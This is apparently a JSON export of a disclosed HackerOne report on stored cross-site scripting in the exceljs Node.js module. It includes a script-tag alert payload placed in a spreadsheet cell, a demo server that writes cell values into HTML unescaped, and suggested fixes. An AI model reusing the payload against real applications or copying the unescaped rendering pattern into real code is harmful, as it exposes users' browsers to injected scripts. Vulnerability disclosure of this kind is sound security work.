{
  "id": 356809,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTY4MDk=",
  "url": "https://hackerone.com/reports/356809",
  "title": "[exceljs] Possible XSS via cell value when worksheet is displayed in browser",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-05-24T13:39:32.401Z",
  "submitted_at": "2018-05-24T13:39:32.401Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-16459"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-09-01T19:54:41.794Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-08-02T19:54:32.942Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Team,\n\nI would like to report Stored XSS vulnerability in exceljs module.\nIt allows to execute JavaScript code embeded in the XLS sheet when data from the sheet are displayed in the browser.\n\n## Module\nmodule name: exceljs\nversion: 1.4.6\nnpm page: https://www.npmjs.com/package/exceljs\n\n### Module Description\n\nRead, manipulate and write spreadsheet data and styles to XLSX and JSON.\n\nReverse engineered from Excel spreadsheet files as a project.\n\n### Module Stats\n~18k weekly downloads (estimated ~72k monthly downloads)\n\n## Vulnerability\n\n### Vulnerability Description\n```exceljs``` does not validate data from parsed XLSX file and allows to embed HTML tags, like ```<script>```, directly in the sheet cells. Because of that, I was able to craft malicious JavaScript code and execute it when data from the sheet were displayed in the browser. \n\n### Steps To Reproduce:\n\n- install exceljs\n\n```\n$ npm i exceljs\n```\n\n- create sample XLSX file (I've used LibreOffice 5.1.6.2 for Ubuntu) with the sample data. For one of the cell use the following payload:\n\n```\n<script>alert(`xss!`)</script>\n```\n\n- save the file as testsheet.xlsx\n\n\n- create sample aplication, which reads,parse and prepare HTML with content of sample XLSX file and save it as app.js:\n\n```javascript\n'use strict'\n/*global console*/\nconst Excel = require('exceljs')\nconst http = require('http')\nconst port = 8080\n\nconst workbook = new Excel.Workbook()\nconst filename = 'testsheet.xlsx'\n\nfunction createHTML(worksheet) {\n    let __html = `\n    <table>\n        <tr>\n            <td>${worksheet.getCell('A1').value}</td>\n            <td>${worksheet.getCell('A2').value}</td>\n            <td>${worksheet.getCell('A3').value}</td>\n        </tr>\n        <tr>\n            <td>${worksheet.getCell('B1').value}</td>\n            <td>${worksheet.getCell('B2').value}</td>\n            <td>${worksheet.getCell('B3').value}</td>\n        </tr>\n    </table>\n    `\n\n    return __html\n}\n\nconst requestHandler = (request, response) => {\n    workbook.xlsx.readFile(filename)\n        .then(worksheets => {\n            worksheets.eachSheet(function(worksheet, sheetId) {\n                response.writeHeader(200, {\n                    \"Content-Type\": \"text/html\"\n                })\n                response.write(createHTML(worksheet))\n                response.end()\n            });\n        });\n}\n\nconst server = http.createServer(requestHandler)\n\nserver.listen(port, (err) => {\n    if (err) {\n        return console.log(err)\n    }\n    console.log(`server is listening on ${port}`)\n})\n```\n\n- run the app\n\n```\n$ node app.js\n```\n\n- open http://localhost:8080 in the browser\n\n\n- you will notcie an alert pops up and malicious JavaScript is embeded in page source:\n\n```\n    <table>\n        <tbody><tr>\n            <td><script>alert(`xss!`)</script></td>\n            <td>test</td>\n            <td>another</td>\n        </tr>\n        <tr>\n            <td>1</td>\n            <td>2</td>\n            <td>3</td>\n        </tr>\n    </tbody></table>\n```\n\n\n## Patch\n\nI am aware that due to XLSX files complexity, an implementation of escaping HTML special characters does not resolve the problem here (because ```<```, ```>``` or ```/``` can be used in any other context in XLSX file).\n\nProbably this can be resolved by some kind of escape-on-demand data validation function passed as an optional argument to ```worksheet.getCell()``` function if no special characters are expected in returned value. Blacklisting of ```<script``` or similar well known string also might be an option, but this won't never block attacker in 100% from bypassing such protection.\n\n\n## Supporting Material/References:\n\n- Ubuntu 16.10\n- Node 8.11.1\n- npm v.6.0.1\n- Chromium 67.0.3388.0 (Developer Build) (64-bit)\n- LibreOffice Version: 5.1.6.2 Build ID: 1:5.1.6~rc2-0ubuntu1~xenial3\n\n## Wrap up\n\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nIf application displays content of the processed XLSX file in the browser, an attacker is able to craft malicious JavaScript payload which will be executed in context of user's browser",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-09-01T19:54:33.089Z",
  "allow_singular_disclosure_after": -171997804.97616324,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "eveeez",
    "rramgattie",
    "cryptographer",
    "mrstix"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 12359,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "exceljs",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
